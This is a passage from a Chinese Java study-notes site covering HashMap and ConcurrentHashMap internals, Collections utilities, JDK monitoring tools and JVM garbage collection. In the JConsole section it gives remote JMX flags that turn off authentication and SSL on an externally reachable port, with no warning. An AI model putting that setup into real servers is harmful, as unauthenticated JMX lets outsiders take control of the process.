比较的是两个引用是否指向同一个对象地址（两者在内存中存放的地址（堆内存地址）是否指向同一个地方）；\n对于引用类型（包括包装类型）来说，equals 如果没有被重写，对比它们的地址是否相等；如果 equals()方法被重写（例如 String），则比较的是地址里的内容。\n1.5.5. HashMap 的底层实现    1.5.5.1. JDK1.8 之前    JDK1.8 之前 HashMap 底层是 数组和链表 结合在一起使用也就是 链表散列。HashMap 通过 key 的 hashCode 经过扰动函数处理过后得到 hash 值，然后通过 (n - 1) \u0026amp; hash 判断当前元素存放的位置（这里的 n 指的是数组的长度），如果当前位置存在元素的话，就判断该元素与要存入的元素的 hash 值以及 key 是否相同，如果相同的话，直接覆盖，不相同就通过拉链法解决冲突。\n所谓扰动函数指的就是 HashMap 的 hash 方法。使用 hash 方法也就是扰动函数是为了防止一些实现比较差的 hashCode() 方法 换句话说使用扰动函数之后可以减少碰撞。\nJDK 1.8 HashMap 的 hash 方法源码:\nJDK 1.8 的 hash 方法 相比于 JDK 1.7 hash 方法更加简化，但是原理不变。\nstatic final int hash(Object key) { int h; // key.hashCode()：返回散列值也就是hashcode  // ^ ：按位异或  // \u0026gt;\u0026gt;\u0026gt;:无符号右移，忽略符号位，空位都以0补齐  return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16); } 对比一下 JDK1.7 的 HashMap 的 hash 方法源码.\nstatic int hash(int h) { // This function ensures that hashCodes that differ only by  // constant multiples at each bit position have a bounded  // number of collisions (approximately 8 at default load factor).  h ^= (h \u0026gt;\u0026gt;\u0026gt; 20) ^ (h \u0026gt;\u0026gt;\u0026gt; 12); return h ^ (h \u0026gt;\u0026gt;\u0026gt; 7) ^ (h \u0026gt;\u0026gt;\u0026gt; 4); } 相比于 JDK1.8 的 hash 方法 ，JDK 1.7 的 hash 方法的性能会稍差一点点，因为毕竟扰动了 4 次。\n所谓 “拉链法” 就是：将链表和数组相结合。也就是说创建一个链表数组，数组中每一格就是一个链表。若遇到哈希冲突，则将冲突的值加到链表中即可。\n1.5.5.2. JDK1.8 之后    相比于之前的版本， JDK1.8 之后在解决哈希冲突时有了较大的变化，当链表长度大于阈值（默认为 8）（将链表转换成红黑树前会判断，如果当前数组的长度小于 64，那么会选择先进行数组扩容，而不是转换为红黑树）时，将链表转化为红黑树，以减少搜索时间。\n TreeMap、TreeSet 以及 JDK1.8 之后的 HashMap 底层都用到了红黑树。红黑树就是为了解决二叉查找树的缺陷，因为二叉查找树在某些情况下会退化成一个线性结构。\n 1.5.6. HashMap 的长度为什么是 2 的幂次方    为了能让 HashMap 存取高效，尽量较少碰撞，也就是要尽量把数据分配均匀。我们上面也讲到了过了，Hash 值的范围值-2147483648 到 2147483647，前后加起来大概 40 亿的映射空间，只要哈希函数映射得比较均匀松散，一般应用是很难出现碰撞的。但问题是一个 40 亿长度的数组，内存是放不下的。所以这个散列值是不能直接拿来用的。用之前还要先做对数组的长度取模运算，得到的余数才能用来要存放的位置也就是对应的数组下标。这个数组下标的计算方法是“ (n - 1) \u0026amp; hash”。（n 代表数组长度）。这也就解释了 HashMap 的长度为什么是 2 的幂次方。\n这个算法应该如何设计呢？\n我们首先可能会想到采用%取余的操作来实现。但是，重点来了：“取余(%)操作中如果除数是 2 的幂次则等价于与其除数减一的与(\u0026amp;)操作（也就是说 hash%length==hash\u0026amp;(length-1)的前提是 length 是 2 的 n 次方；）。” 并且 采用二进制位操作 \u0026amp;，相对于%能够提高运算效率，这就解释了 HashMap 的长度为什么是 2 的幂次方。\n1.5.7. HashMap 多线程操作导致死循环问题    主要原因在于并发下的 Rehash 会造成元素之间会形成一个循环链表。不过，jdk 1.8 后解决了这个问题，但是还是不建议在多线程下使用 HashMap,因为多线程下使用 HashMap 还是会存在其他问题比如数据丢失。并发环境下推荐使用 ConcurrentHashMap 。\n详情请查看：https://coolshell.cn/articles/9606.html\n1.5.8. HashMap 有哪几种常见的遍历方式?    HashMap 的 7 种遍历方式与性能分析！\n1.5.9. ConcurrentHashMap 和 Hashtable 的区别    ConcurrentHashMap 和 Hashtable 的区别主要体现在实现线程安全的方式上不同。\n 底层数据结构： JDK1.7 的 ConcurrentHashMap 底层采用 分段的数组+链表 实现，JDK1.8 采用的数据结构跟 HashMap1.8 的结构一样，数组+链表/红黑二叉树。Hashtable 和 JDK1.8 之前的 HashMap 的底层数据结构类似都是采用 数组+链表 的形式，数组是 HashMap 的主体，链表则是主要为了解决哈希冲突而存在的； 实现线程安全的方式（重要）： ① 在 JDK1.7 的时候，ConcurrentHashMap（分段锁） 对整个桶数组进行了分割分段(Segment)，每一把锁只锁容器其中一部分数据，多线程访问容器里不同数据段的数据，就不会存在锁竞争，提高并发访问率。 到了 JDK1.8 的时候已经摒弃了 Segment 的概念，而是直接用 Node 数组+链表+红黑树的数据结构来实现，并发控制使用 synchronized 和 CAS 来操作。（JDK1.6 以后 对 synchronized 锁做了很多优化） 整个看起来就像是优化过且线程安全的 HashMap，虽然在 JDK1.8 中还能看到 Segment 的数据结构，但是已经简化了属性，只是为了兼容旧版本；② Hashtable(同一把锁) :使用 synchronized 来保证线程安全，效率非常低下。当一个线程访问同步方法时，其他线程也访问同步方法，可能会进入阻塞或轮询状态，如使用 put 添加元素，另一个线程不能使用 put 添加元素，也不能使用 get，竞争会越来越激烈效率越低。  两者的对比图：\nHashtable:\nhttps://www.cnblogs.com/chengxiao/p/6842045.html\nJDK1.7 的 ConcurrentHashMap：\nhttps://www.cnblogs.com/chengxiao/p/6842045.html\nJDK1.8 的 ConcurrentHashMap：\nJDK1.8 的 ConcurrentHashMap 不再是 Segment 数组 + HashEntry 数组 + 链表，而是 Node 数组 + 链表 / 红黑树。不过，Node 只能用于链表的情况，红黑树的情况需要使用 TreeNode。当冲突链表达到一定长度时，链表会转换成红黑树。\n1.5.10. ConcurrentHashMap 线程安全的具体实现方式/底层具体实现    1.5.10.1. JDK1.7（上面有示意图）    首先将数据分为一段一段的存储，然后给每一段数据配一把锁，当一个线程占用锁访问其中一个段数据时，其他段的数据也能被其他线程访问。\nConcurrentHashMap 是由 Segment 数组结构和 HashEntry 数组结构组成。\nSegment 实现了 ReentrantLock,所以 Segment 是一种可重入锁，扮演锁的角色。HashEntry 用于存储键值对数据。\nstatic class Segment\u0026lt;K,V\u0026gt; extends ReentrantLock implements Serializable { } 一个 ConcurrentHashMap 里包含一个 Segment 数组。Segment 的结构和 HashMap 类似，是一种数组和链表结构，一个 Segment 包含一个 HashEntry 数组，每个 HashEntry 是一个链表结构的元素，每个 Segment 守护着一个 HashEntry 数组里的元素，当对 HashEntry 数组的数据进行修改时，必须首先获得对应的 Segment 的锁。\n1.5.10.2. JDK1.8 （上面有示意图）    ConcurrentHashMap 取消了 Segment 分段锁，采用 CAS 和 synchronized 来保证并发安全。数据结构跟 HashMap1.8 的结构类似，数组+链表/红黑二叉树。Java 8 在链表长度超过一定阈值（8）时将链表（寻址时间复杂度为 O(N)）转换为红黑树（寻址时间复杂度为 O(log(N))）\nsynchronized 只锁定当前链表或红黑二叉树的首节点，这样只要 hash 不冲突，就不会产生并发，效率又提升 N 倍。\n1.6. Collections 工具类    Collections 工具类常用方法:\n 排序 查找,替换操作 同步控制(不推荐，需要线程安全的集合类型时请考虑使用 JUC 包下的并发集合)  1.6.1. 排序操作    void reverse(List list)//反转 void shuffle(List list)//随机排序 void sort(List list)//按自然排序的升序排序 void sort(List list, Comparator c)//定制排序，由Comparator控制排序逻辑 void swap(List list, int i , int j)//交换两个索引位置的元素 void rotate(List list, int distance)//旋转。当distance为正数时，将list后distance个元素整体移到前面。当distance为负数时，将 list的前distance个元素整体移到后面 1.6.2. 查找,替换操作    int binarySearch(List list, Object key)//对List进行二分查找，返回索引，注意List必须是有序的 int max(Collection coll)//根据元素的自然顺序，返回最大的元素。 类比int min(Collection coll) int max(Collection coll, Comparator c)//根据定制排序，返回最大元素，排序规则由Comparatator类控制。类比int min(Collection coll, Comparator c) void fill(List list, Object obj)//用指定的元素代替指定list中的所有元素 int frequency(Collection c, Object o)//统计元素出现次数 int indexOfSubList(List list, List target)//统计target在list中第一次出现的索引，找不到则返回-1，类比int lastIndexOfSubList(List source, list target) boolean replaceAll(List list, Object oldVal, Object newVal)//用新元素替换旧元素 1.6.3. 同步控制    Collections 提供了多个synchronizedXxx()方法·，该方法可以将指定集合包装成线程同步的集合，从而解决多线程并发访问集合时的线程安全问题。\n我们知道 HashSet，TreeSet，ArrayList,LinkedList,HashMap,TreeMap 都是线程不安全的。Collections 提供了多个静态方法可以把他们包装成线程同步的集合。\n最好不要用下面这些方法，效率非常低，需要线程安全的集合类型时请考虑使用 JUC 包下的并发集合。\n方法如下：\nsynchronizedCollection(Collection\u0026lt;T\u0026gt; c) //返回指定 collection 支持的同步（线程安全的）collection。 synchronizedList(List\u0026lt;T\u0026gt; list)//返回指定列表支持的同步（线程安全的）List。 synchronizedMap(Map\u0026lt;K,V\u0026gt; m) //返回由指定映射支持的同步（线程安全的）Map。 synchronizedSet(Set\u0026lt;T\u0026gt; s) //返回指定 set 支持的同步（线程安全的）set。 《Java 面试突击》: Java 程序员面试必备的《Java 面试突击》V3.0 PDF 版本扫码关注下面的公众号，在后台回复 \u0026ldquo;面试突击\u0026rdquo; 即可免费领取！\n"},{"id":234,"href":"/java/jvm/JDK%E7%9B%91%E6%8E%A7%E5%92%8C%E6%95%85%E9%9A%9C%E5%A4%84%E7%90%86%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/","title":"JDK监控和故障处理工具总结","parent":"jvm","content":" JDK 监控和故障处理工具总结  JDK 命令行工具  jps:查看所有 Java 进程 jstat: 监视虚拟机各种运行状态信息  jinfo: 实时地查看和调整虚拟机各项参数 jmap:生成堆转储快照 jhat: 分析 heapdump 文件 jstack :生成虚拟机当前时刻的线程快照   JDK 可视化分析工具  JConsole:Java 监视与管理控制台  连接 Jconsole 查看 Java 程序概况 内存监控 线程监控   Visual VM:多合一故障处理工具      JDK 监控和故障处理工具总结    JDK 命令行工具    这些命令在 JDK 安装目录下的 bin 目录下：\n jps (JVM Process Status）: 类似 UNIX 的 ps 命令。用于查看所有 Java 进程的启动类、传入参数和 Java 虚拟机参数等信息； jstat（JVM Statistics Monitoring Tool）: 用于收集 HotSpot 虚拟机各方面的运行数据; jinfo (Configuration Info for Java) : Configuration Info for Java,显示虚拟机配置信息; jmap (Memory Map for Java) : 生成堆转储快照; jhat (JVM Heap Dump Browser) : 用于分析 heapdump 文件，它会建立一个 HTTP/HTML 服务器，让用户可以在浏览器上查看分析结果; jstack (Stack Trace for Java) : 生成虚拟机当前时刻的线程快照，线程快照就是当前虚拟机内每一条线程正在执行的方法堆栈的集合。  jps:查看所有 Java 进程    jps(JVM Process Status) 命令类似 UNIX 的 ps 命令。\njps：显示虚拟机执行主类名称以及这些进程的本地虚拟机唯一 ID（Local Virtual Machine Identifier,LVMID）。jps -q ：只输出进程的本地虚拟机唯一 ID。\nC:\\Users\\SnailClimb\u0026gt;jps 7360 NettyClient2 17396 7972 Launcher 16504 Jps 17340 NettyServer jps -l:输出主类的全名，如果进程执行的是 Jar 包，输出 Jar 路径。\nC:\\Users\\SnailClimb\u0026gt;jps -l 7360 firstNettyDemo.NettyClient2 17396 7972 org.jetbrains.jps.cmdline.Launcher 16492 sun.tools.jps.Jps 17340 firstNettyDemo.NettyServer jps -v：输出虚拟机进程启动时 JVM 参数。\njps -m：输出传递给 Java 进程 main() 函数的参数。\njstat: 监视虚拟机各种运行状态信息    jstat（JVM Statistics Monitoring Tool） 使用于监视虚拟机各种运行状态信息的命令行工具。 它可以显示本地或者远程（需要远程主机提供 RMI 支持）虚拟机进程中的类信息、内存、垃圾收集、JIT 编译等运行数据，在没有 GUI，只提供了纯文本控制台环境的服务器上，它将是运行期间定位虚拟机性能问题的首选工具。\njstat 命令使用格式：\njstat -\u0026lt;option\u0026gt; [-t] [-h\u0026lt;lines\u0026gt;] \u0026lt;vmid\u0026gt; [\u0026lt;interval\u0026gt; [\u0026lt;count\u0026gt;]] 比如 jstat -gc -h3 31736 1000 10表示分析进程 id 为 31736 的 gc 情况，每隔 1000ms 打印一次记录，打印 10 次停止，每 3 行后打印指标头部。\n常见的 option 如下：\n jstat -class vmid ：显示 ClassLoader 的相关信息； jstat -compiler vmid ：显示 JIT 编译的相关信息； jstat -gc vmid ：显示与 GC 相关的堆信息； jstat -gccapacity vmid ：显示各个代的容量及使用情况； jstat -gcnew vmid ：显示新生代信息； jstat -gcnewcapcacity vmid ：显示新生代大小与使用情况； jstat -gcold vmid ：显示老年代和永久代的行为统计，从jdk1.8开始,该选项仅表示老年代，因为永久代被移除了； jstat -gcoldcapacity vmid ：显示老年代的大小； jstat -gcpermcapacity vmid ：显示永久代大小，从jdk1.8开始,该选项不存在了，因为永久代被移除了； jstat -gcutil vmid ：显示垃圾收集信息；  另外，加上 -t参数可以在输出信息上加一个 Timestamp 列，显示程序的运行时间。\njinfo: 实时地查看和调整虚拟机各项参数    jinfo vmid :输出当前 jvm 进程的全部参数和系统属性 (第一部分是系统的属性，第二部分是 JVM 的参数)。\njinfo -flag name vmid :输出对应名称的参数的具体值。比如输出 MaxHeapSize、查看当前 jvm 进程是否开启打印 GC 日志 ( -XX:PrintGCDetails :详细 GC 日志模式，这两个都是默认关闭的)。\nC:\\Users\\SnailClimb\u0026gt;jinfo -flag MaxHeapSize 17340 -XX:MaxHeapSize=2124414976 C:\\Users\\SnailClimb\u0026gt;jinfo -flag PrintGC 17340 -XX:-PrintGC 使用 jinfo 可以在不重启虚拟机的情况下，可以动态的修改 jvm 的参数。尤其在线上的环境特别有用,请看下面的例子：\njinfo -flag [+|-]name vmid 开启或者关闭对应名称的参数。\nC:\\Users\\SnailClimb\u0026gt;jinfo -flag PrintGC 17340 -XX:-PrintGC C:\\Users\\SnailClimb\u0026gt;jinfo -flag +PrintGC 17340 C:\\Users\\SnailClimb\u0026gt;jinfo -flag PrintGC 17340 -XX:+PrintGC jmap:生成堆转储快照    jmap（Memory Map for Java）命令用于生成堆转储快照。 如果不使用 jmap 命令，要想获取 Java 堆转储，可以使用 “-XX:+HeapDumpOnOutOfMemoryError” 参数，可以让虚拟机在 OOM 异常出现之后自动生成 dump 文件，Linux 命令下可以通过 kill -3 发送进程退出信号也能拿到 dump 文件。\njmap 的作用并不仅仅是为了获取 dump 文件，它还可以查询 finalizer 执行队列、Java 堆和永久代的详细信息，如空间使用率、当前使用的是哪种收集器等。和jinfo一样，jmap有不少功能在 Windows 平台下也是受限制的。\n示例：将指定应用程序的堆快照输出到桌面。后面，可以通过 jhat、Visual VM 等工具分析该堆文件。\nC:\\Users\\SnailClimb\u0026gt;jmap -dump:format=b,file=C:\\Users\\SnailClimb\\Desktop\\heap.hprof 17340 Dumping heap to C:\\Users\\SnailClimb\\Desktop\\heap.hprof ... Heap dump file created jhat: 分析 heapdump 文件    jhat 用于分析 heapdump 文件，它会建立一个 HTTP/HTML 服务器，让用户可以在浏览器上查看分析结果。\nC:\\Users\\SnailClimb\u0026gt;jhat C:\\Users\\SnailClimb\\Desktop\\heap.hprof Reading from C:\\Users\\SnailClimb\\Desktop\\heap.hprof... Dump file created Sat May 04 12:30:31 CST 2019 Snapshot read, resolving... Resolving 131419 objects... Chasing references, expect 26 dots.......................... Eliminating duplicate references.......................... Snapshot resolved. Started HTTP server on port 7000 Server is ready. 访问 http://localhost:7000/\njstack :生成虚拟机当前时刻的线程快照    jstack（Stack Trace for Java）命令用于生成虚拟机当前时刻的线程快照。线程快照就是当前虚拟机内每一条线程正在执行的方法堆栈的集合.\n生成线程快照的目的主要是定位线程长时间出现停顿的原因，如线程间死锁、死循环、请求外部资源导致的长时间等待等都是导致线程长时间停顿的原因。线程出现停顿的时候通过jstack来查看各个线程的调用堆栈，就可以知道没有响应的线程到底在后台做些什么事情，或者在等待些什么资源。\n下面是一个线程死锁的代码。我们下面会通过 jstack 命令进行死锁检查，输出死锁信息，找到发生死锁的线程。\npublic class DeadLockDemo { private static Object resource1 = new Object();//资源 1  private static Object resource2 = new Object();//资源 2  public static void main(String[] args) { new Thread(() -\u0026gt; { synchronized (resource1) { System.out.println(Thread.currentThread() + \u0026#34;get resource1\u0026#34;); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread() + \u0026#34;waiting get resource2\u0026#34;); synchronized (resource2) { System.out.println(Thread.currentThread() + \u0026#34;get resource2\u0026#34;); } } }, \u0026#34;线程 1\u0026#34;).start(); new Thread(() -\u0026gt; { synchronized (resource2) { System.out.println(Thread.currentThread() + \u0026#34;get resource2\u0026#34;); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread() + \u0026#34;waiting get resource1\u0026#34;); synchronized (resource1) { System.out.println(Thread.currentThread() + \u0026#34;get resource1\u0026#34;); } } }, \u0026#34;线程 2\u0026#34;).start(); } } Output\nThread[线程 1,5,main]get resource1 Thread[线程 2,5,main]get resource2 Thread[线程 1,5,main]waiting get resource2 Thread[线程 2,5,main]waiting get resource1 线程 A 通过 synchronized (resource1) 获得 resource1 的监视器锁，然后通过 Thread.sleep(1000);让线程 A 休眠 1s 为的是让线程 B 得到执行然后获取到 resource2 的监视器锁。线程 A 和线程 B 休眠结束了都开始企图请求获取对方的资源，然后这两个线程就会陷入互相等待的状态，这也就产生了死锁。\n通过 jstack 命令分析：\nC:\\Users\\SnailClimb\u0026gt;jps 13792 KotlinCompileDaemon 7360 NettyClient2 17396 7972 Launcher 8932 Launcher 9256 DeadLockDemo 10764 Jps 17340 NettyServer C:\\Users\\SnailClimb\u0026gt;jstack 9256 输出的部分内容如下：\nFound one Java-level deadlock: ============================= \u0026#34;线程 2\u0026#34;: waiting to lock monitor 0x000000000333e668 (object 0x00000000d5efe1c0, a java.lang.Object), which is held by \u0026#34;线程 1\u0026#34; \u0026#34;线程 1\u0026#34;: waiting to lock monitor 0x000000000333be88 (object 0x00000000d5efe1d0, a java.lang.Object), which is held by \u0026#34;线程 2\u0026#34; Java stack information for the threads listed above: =================================================== \u0026#34;线程 2\u0026#34;: at DeadLockDemo.lambda$main$1(DeadLockDemo.java:31) - waiting to lock \u0026lt;0x00000000d5efe1c0\u0026gt; (a java.lang.Object) - locked \u0026lt;0x00000000d5efe1d0\u0026gt; (a java.lang.Object) at DeadLockDemo$$Lambda$2/1078694789.run(Unknown Source) at java.lang.Thread.run(Thread.java:748) \u0026#34;线程 1\u0026#34;: at DeadLockDemo.lambda$main$0(DeadLockDemo.java:16) - waiting to lock \u0026lt;0x00000000d5efe1d0\u0026gt; (a java.lang.Object) - locked \u0026lt;0x00000000d5efe1c0\u0026gt; (a java.lang.Object) at DeadLockDemo$$Lambda$1/1324119927.run(Unknown Source) at java.lang.Thread.run(Thread.java:748) Found 1 deadlock. 可以看到 jstack 命令已经帮我们找到发生死锁的线程的具体信息。\nJDK 可视化分析工具    JConsole:Java 监视与管理控制台    JConsole 是基于 JMX 的可视化监视、管理工具。可以很方便的监视本地及远程服务器的 java 进程的内存使用情况。你可以在控制台输出console命令启动或者在 JDK 目录下的 bin 目录找到jconsole.exe然后双击启动。\n连接 Jconsole    如果需要使用 JConsole 连接远程进程，可以在远程 Java 程序启动时加上下面这些参数:\n-Djava.rmi.server.hostname=外网访问 ip 地址 -Dcom.sun.management.jmxremote.port=60001 //监控的端口号 -Dcom.sun.management.jmxremote.authenticate=false //关闭认证 -Dcom.sun.management.jmxremote.ssl=false 在使用 JConsole 连接时，远程进程地址如下：\n外网访问 ip 地址:60001 查看 Java 程序概况    内存监控    JConsole 可以显示当前内存的详细信息。不仅包括堆内存/非堆内存的整体信息，还可以细化到 eden 区、survivor 区等的使用情况，如下图所示。\n点击右边的“执行 GC(G)”按钮可以强制应用程序执行一个 Full GC。\n  新生代 GC（Minor GC）:指发生新生代的的垃圾收集动作，Minor GC 非常频繁，回收速度一般也比较快。 老年代 GC（Major GC/Full GC）:指发生在老年代的 GC，出现了 Major GC 经常会伴随至少一次的 Minor GC（并非绝对），Major GC 的速度一般会比 Minor GC 的慢 10 倍以上。   线程监控    类似我们前面讲的 jstack 命令，不过这个是可视化的。\n最下面有一个\u0026quot;检测死锁 (D)\u0026ldquo;按钮，点击这个按钮可以自动为你找到发生死锁的线程以及它们的详细信息 。\nVisual VM:多合一故障处理工具    VisualVM 提供在 Java 虚拟机 (Java Virutal Machine, JVM) 上运行的 Java 应用程序的详细信息。在 VisualVM 的图形用户界面中，您可以方便、快捷地查看多个 Java 应用程序的相关信息。Visual VM 官网：https://visualvm.github.io/ 。Visual VM 中文文档:https://visualvm.github.io/documentation.html。\n下面这段话摘自《深入理解 Java 虚拟机》。\n VisualVM（All-in-One Java Troubleshooting Tool）是到目前为止随 JDK 发布的功能最强大的运行监视和故障处理程序，官方在 VisualVM 的软件说明中写上了“All-in-One”的描述字样，预示着他除了运行监视、故障处理外，还提供了很多其他方面的功能，如性能分析（Profiling）。VisualVM 的性能分析功能甚至比起 JProfiler、YourKit 等专业且收费的 Profiling 工具都不会逊色多少，而且 VisualVM 还有一个很大的优点：不需要被监视的程序基于特殊 Agent 运行，因此他对应用程序的实际性能的影响很小，使得他可以直接应用在生产环境中。这个优点是 JProfiler、YourKit 等工具无法与之媲美的。\n VisualVM 基于 NetBeans 平台开发，因此他一开始就具备了插件扩展功能的特性，通过插件扩展支持，VisualVM 可以做到：\n 显示虚拟机进程以及进程的配置、环境信息（jps、jinfo）。 监视应用程序的 CPU、GC、堆、方法区以及线程的信息（jstat、jstack）。 dump 以及分析堆转储快照（jmap、jhat）。 方法级的程序运行性能分析，找到被调用最多、运行时间最长的方法。 离线程序快照：收集程序的运行时配置、线程 dump、内存 dump 等信息建立一个快照，可以将快照发送开发者处进行 Bug 反馈。 其他 plugins 的无限的可能性\u0026hellip;\u0026hellip;  这里就不具体介绍 VisualVM 的使用，如果想了解的话可以看:\n https://visualvm.github.io/documentation.html https://www.ibm.com/developerworks/cn/java/j-lo-visualvm/index.html  "},{"id":235,"href":"/java/jvm/jvmjvm-%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/","title":"jvm 知识点汇总","parent":"jvm","content":"无论什么级别的Java从业者，JVM都是进阶时必须迈过的坎。不管是工作还是面试中，JVM都是必考题。如果不懂JVM的话，薪酬会非常吃亏（近70%的面试者挂在JVM上了）。\n掌握了JVM机制，就等于学会了深层次解决问题的方法。对于Java开发者而言，只有熟悉底层虚拟机的运行机制，才能通过JVM日志深入到字节码的层次去分析排查问题，发现隐性的系统缺陷，进而提升系统性能。\n一些技术人员开发工具用得很熟练，触及JVM问题时却是模棱两可，甚至连内存模型和内存区域，HotSpot和JVM规范，都混淆不清。工作很长时间，在生产时还在用缺省参数来直接启动，以致系统运行时出现性能、稳定性等问题时束手无措，不知该如何追踪排查。久而久之，这对自己的职业成长是极为不利的。\n掌握JVM，是深入Java技术栈的必经之路。\n"},{"id":236,"href":"/java/jvm/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/","title":"JVM垃圾回收","parent":"jvm","content":" JVM 垃圾回收  写在前面  本节常见面试题 本文导火索   1 揭开 JVM 内存分配与回收的神秘面纱  1.1 对象优先在 eden 区分配 1.2 大对象直接进入老年代 1.3 长期存活的对象将进入老年代 1.4 动态对象年龄判定 1.5 主要进行 gc 的区域   2 对象已经死亡？  2.1 引用计数法 2.2 可达性分析算法 2.3 再谈引用 2.4 不可达的对象并非“非死不可” 2.5 如何判断一个常量是废弃常量？ 2.6 如何判断一个类是无用的类   3 垃圾收集算法  3.1 标记-清除算法 3.2 标记-复制算法 3.3 标记-整理算法 3.4 分代收集算法   4 垃圾收集器  4.1 Serial 收集器 4.2 ParNew 收集器 4.3 Parallel Scavenge 收集器 4.4.Serial Old 收集器 4.5 Parallel Old 收集器 4.6 CMS 收集器 4.7 G1 收集器 4.8 ZGC 收集器   参考    JVM 垃圾回收    写在前面    本节常见面试题    问题答案在文中都有提到\n 如何判断对象是否死亡（两种方法）。 简单的介绍一下强引用、软引用、弱引用、虚引用（虚引用与软引用和弱引用的区别、使用软引用能带来的好处）。 如何判断一个常量是废弃常量 如何判断一个类是无用的类 垃圾收集有哪些算法，各自的特点？ HotSpot 为什么要分为新生代和老年代？ 常见的垃圾回收器有哪些？ 介绍一下 CMS,G1 收集器。 Minor Gc 和 Full GC 有什么不同呢？  本文导火索    当需要排查各种内存溢出问题、当垃圾收集成为系统达到更高并发的瓶颈时，我们就需要对这些“自动化”的技术实施必要的监控和调节。\n1 揭开 JVM 内存分配与回收的神秘面纱    Java 的自动内存管理主要是针对对象内存的回收和对象内存的分配。同时，Java 自动内存管理最核心的功能是 堆 内存中对象的分配与回收。\nJava 堆是垃圾收集器管理的主要区域，因此也被称作GC 堆（Garbage Collected Heap）.从垃圾回收的角度，由于现在收集器基本都采用分代垃圾收集算法，所以 Java 堆还可以细分为：新生代和老年代：再细致一点有：Eden 空间、From Survivor、To Survivor 空间等。进一步划分的目的是更好地回收内存，或者更快地分配内存。\n堆空间的基本结构：\n上图所示的 Eden 区、From Survivor0(\u0026ldquo;From\u0026rdquo;) 区、To Survivor1(\u0026ldquo;To\u0026rdquo;) 区都属于新生代，Old Memory 区属于老年代。\n大部分情况，对象都会首先在 Eden 区域分配，在一次新生代垃圾回收后，如果对象还存活，则会进入 s0 或者 s1，并且对象的年龄还会加 1(Eden 区-\u0026gt;Survivor 区后对象的初始年龄变为 1)，当它的年龄增加到一定程度（默认为大于 15 岁），就会被晋升到老年代中。对象晋升到老年代的年龄阈值，可以通过参数 -XX:MaxTenuringThreshold 来设置默认值，这个值会在虚拟机运行过程中进行调整，可以通过-XX:+PrintTenuringDistribution来打印出当次GC后的Threshold。\n 🐛 修正（参见：issue552）：“Hotspot 遍历所有对象时，按照年龄从小到大对其所占用的大小进行累积，当累积的某个年龄大小超过了 survivor 区的一半时，取这个年龄和 MaxTenuringThreshold 中更小的一个值，作为新的晋升年龄阈值”。\n动态年龄计算的代码如下\nuint ageTable::compute_tenuring_threshold(size_t survivor_capacity) { //survivor_capacity是survivor空间的大小  size_t desired_survivor_size = (size_t)((((double)survivor_capacity)*TargetSurvivorRatio)/100); size_t total = 0; uint age = 1; while (age \u0026lt; table_size) { //sizes数组是每个年龄段对象大小  total += sizes[age]; if (total \u0026gt; desired_survivor_size) { break; } age++; } uint result = age \u0026lt; MaxTenuringThreshold ? age : MaxTenuringThreshold; ... }  经过这次 GC 后，Eden 区和\u0026quot;From\u0026quot;区已经被清空。这个时候，\u0026ldquo;From\u0026quot;和\u0026quot;To\u0026quot;会交换他们的角色，也就是新的\u0026quot;To\u0026quot;就是上次 GC 前的“From”，新的\u0026quot;From\u0026quot;就是上次 GC 前的\u0026quot;To\u0026rdquo;。不管怎样，都会保证名为 To 的 Survivor 区域是空的。Minor GC 会一直重复这样的过程，在这个过程中，有可能当次Minor GC后，Survivor 的\u0026quot;From\u0026quot;区域空间不够用，有一些还达不到进入老年代条件的实例放不下，则放不下的部分会提前进入老年代。\n接下来我们提供一个调试脚本来测试这个过程。\n调试代码参数如下\n-verbose:gc -Xmx200M -Xms200M -Xmn50M -XX:+PrintGCDetails -XX:TargetSurvivorRatio=60 -XX:+PrintTenuringDistribution -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:MaxTenuringThreshold=3 -XX:+UseConcMarkSweepGC -XX:+UseParNewGC 示例代码如下：\n/* * 本实例用于java GC以后，新生代survivor区域的变化，以及晋升到老年代的时间和方式的测试代码。需要自行分步注释不需要的代码进行反复测试对比 * * 由于java的main函数以及其他基础服务也会占用一些eden空间，所以要提前空跑一次main函数，来看看这部分占用。 * * 自定义的代码中，我们使用堆内分配数组和栈内分配数组的方式来分别模拟不可被GC的和可被GC的资源。 * * * */ public class JavaGcTest { public static void main(String[] args) throws InterruptedException { //空跑一次main函数来查看java服务本身占用的空间大小，我这里是占用了3M。所以40-3=37，下面分配三个1M的数组和一个34M的垃圾数组。  // 为了达到TargetSurvivorRatio（期望占用的Survivor区域的大小）这个比例指定的值, 即5M*60%=3M(Desired survivor size)，  // 这里用1M的数组的分配来达到Desired survivor size  //说明: 5M为S区的From或To的大小，60%为TargetSurvivorRatio参数指定,可以更改参数获取不同的效果。  byte[] byte1m_1 = new byte[1 * 1024 * 1024]; byte[] byte1m_2 = new byte[1 * 1024 * 1024]; byte[] byte1m_3 = new byte[1 * 1024 * 1024]; //使用函数方式来申请空间，函数运行完毕以后，就会变成垃圾等待回收。此时应保证eden的区域占用达到100%。可以通过调整传入值来达到效果。  makeGarbage(34); //再次申请一个数组，因为eden已经满了，所以这里会触发Minor GC  byte[] byteArr = new byte[10*1024*1024]; // 这次Minor Gc时, 三个1M的数组因为尚有引用，所以进入From区域（因为是第一次GC）age为1  // 且由于From区已经占用达到了60%(-XX:TargetSurvivorRatio=60), 所以会重新计算对象晋升的age。  // 计算方法见上文，计算出age：min(age, MaxTenuringThreshold) = 1，输出中会有Desired survivor size 3145728 bytes, new threshold 1 (max 3)字样  //新的数组byteArr进入eden区域。  //再次触发垃圾回收，证明三个1M的数组会因为其第二次回收后age为2，大于上一次计算出的new threshold 1，所以进入老年代。  //而byteArr因为超过survivor的单个区域，直接进入了老年代。  makeGarbage(34); } private static void makeGarbage(int size){ byte[] byteArrTemp = new byte[size * 1024 * 1024]; } } 注意:如下输出结果中老年代的信息为 concurrent mark-sweep generation 和以前版本略有不同。另外，还列出了某次GC后是否重新生成了threshold，以及各个年龄占用空间的大小。\n2021-07-01T10:41:32.257+0800: [GC (Allocation Failure) 2021-07-01T10:41:32.257+0800: [ParNew Desired survivor size 3145728 bytes, new threshold 1 (max 3) - age 1: 3739264 bytes, 3739264 total : 